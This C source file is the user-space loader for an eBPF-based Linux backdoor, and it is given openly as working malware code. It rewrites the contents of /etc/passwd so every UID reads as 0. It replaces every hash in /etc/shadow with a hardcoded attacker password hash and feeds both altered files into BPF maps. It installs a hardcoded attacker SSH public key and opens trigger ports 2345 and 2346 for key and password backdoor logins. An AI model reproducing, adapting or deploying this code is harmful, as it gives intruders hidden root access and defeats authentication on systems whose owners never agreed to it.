#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <fcntl.h>
#include <bpf/bpf.h>

#include "backdoor.def.h"
#include "backdoor.skel.h"

char backdoor_publickey[] = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHgLzgvt+dvcDklpa1+j0fiaodAaHIP552JCnmDw00to";
char backdoor_hashed_passwd[] = "$6$a$WURSl9l0w.6ozNrOYJOTooNhEM03emqmdNIgu8oSwzJxM.gyGCnRGqUsecNA3sRz.sJi6HwnI1yiX5yugU2/R1"; // lol

struct backdoor_bpf *skel;

static void int_exit(int sig)
{
    backdoor_bpf__destroy(skel);
    exit(0);
}

static int read_file(char *path, char *buff, int buff_len)
{
    int fd = open(path, O_RDONLY);
    if (fd < 0)
    {
        fprintf(stderr, "Failed to open %s\n", path);
        return -1;
    }
    int ret = read(fd, buff, buff_len);
    if (ret < 0)
    {
        fprintf(stderr, "Failed to read %s\n", path);
        return -1;
    }
    if (ret == buff_len && buff[buff_len - 1] != '\0')
    {
        fprintf(stderr, "%s file is too long, crank up the buffer size\n", path);
        return -1;
    }
    close(fd);
    return ret;
}

static int get_passwd_backdoor(char *buff, int buff_len)
{
    int ret = read_file("/etc/passwd", buff, buff_len);
    if (ret < 0)
    {
        return -1;
    }
    for (int i = 0; i < ret; i++)
    {
        if (buff[i] >= '1' && buff[i] <= '9')
        {
            buff[i] = '0';
        }
    }

    return ret;
}

static int get_shadow_backdoor(char *buff, int buff_len)
{
    int ret = read_file("/etc/shadow", buff, buff_len);
    if (ret < 0)
    {
        return -1;
    }
    for (int i = 0; i < ret; i++)
    {
        if (buff[i] == '$')
        {
            // We need to know the passwd length (so until we find the next ':' )
            int j = i;
            while (j < ret && buff[j] != ':')
            {
                j++;
            }
            if (j < ret)
            {
                // We found the next ':'
                int passwd_len = j - i;
                // apply the backdoor passwd
                memcpy(buff + i, backdoor_hashed_passwd, strlen(backdoor_hashed_passwd));
                // we need to shift the rest of the string to the left
                int offset = passwd_len - strlen(backdoor_hashed_passwd);
                // using memmove to handle overlapping memory
                memmove(buff + i + strlen(backdoor_hashed_passwd), buff + j, ret - j + 1);
                // update ret
                ret -= offset;
                i = j;
            }
        }
    }

    return ret;
}

int set_altered_file(char *buffer, int buffer_len, int position)
{
    const int pos = position;
    int files_fd = bpf_map__fd(skel->maps.files_elem);
    if (files_fd < 0)
    {
        printf("Failed to get files_fd\n");
        return -1;
    }
    if (buffer_len > file_block_len)
    {
        printf("passwd_len is too long\n");
        return -1;
    }
    struct file_block passwd_block = {
        .buff_len = buffer_len,
        .buff = {0}};
    memcpy(passwd_block.buff, buffer, buffer_len);
    return bpf_map_update_elem(files_fd, &pos, &passwd_block, 0);
}

int set_backdoor_pubkey(char *pubkey, int pubkey_len)
{
    const int zero = 0;
    int auth_fd = bpf_map__fd(skel->maps.auth_elem);
    if (auth_fd < 0)
    {
        printf("Failed to get auth_fd\n");
        return -1;
    }
    if (pubkey_len > 256)
    {
        printf("pubkey_len is too long\n");
        return -1;
    }
    return bpf_map_update_elem(auth_fd, &zero, pubkey, 0);
}

int set_port(unsigned short port, int backdoor_type)
{
    // update maps
    int port_fd = bpf_map__fd(skel->maps.trigger_ports);
    if (port_fd < 0)
    {
        fprintf(stderr, "Failed to get port_fd\n");
        return -1;
    }
    if (port == 0)
    {
        return bpf_map_delete_elem(port_fd, &port);
    }
    return bpf_map_update_elem(port_fd, &port, &backdoor_type, 0);
}

int main(int argc, char **argv)
{
    int err;

    skel = backdoor_bpf__open();
    if (!skel)
    {
        fprintf(stderr, "Failed to open and load BPF skeleton\n");
        return 1;
    }

    err = backdoor_bpf__load(skel);
    if (err)
    {
        fprintf(stderr, "Failed to open and load BPF skeleton\n");
    }

    err = backdoor_bpf__attach(skel);
    if (err)
    {
        fprintf(stderr, "Failed to attach BPF skeleton\n");
    }

    // Get passwd and shadow
    char passwd_buff[file_block_len], shadow_buff[file_block_len];
    get_passwd_backdoor(passwd_buff, sizeof(passwd_buff));
    get_shadow_backdoor(shadow_buff, sizeof(shadow_buff));

    // Set altered files
    set_altered_file(passwd_buff, strlen(passwd_buff), PASSWD_FILE);
    set_altered_file(shadow_buff, strlen(shadow_buff), SHADOW_FILE);

    // Set backdoor settings
    set_backdoor_pubkey(backdoor_publickey, sizeof(backdoor_publickey));
    set_port(2345, AUTH_BACKDOOR);   // backdoor auth
    set_port(2346, PASSWD_BACKDOOR); // backdoor passwd

    signal(SIGINT, int_exit);
    signal(SIGTERM, int_exit);
    printf("backdoor_bpf loaded successfully.\n");
    while (1)
    {
        sleep(2);
    }
    return 0;
}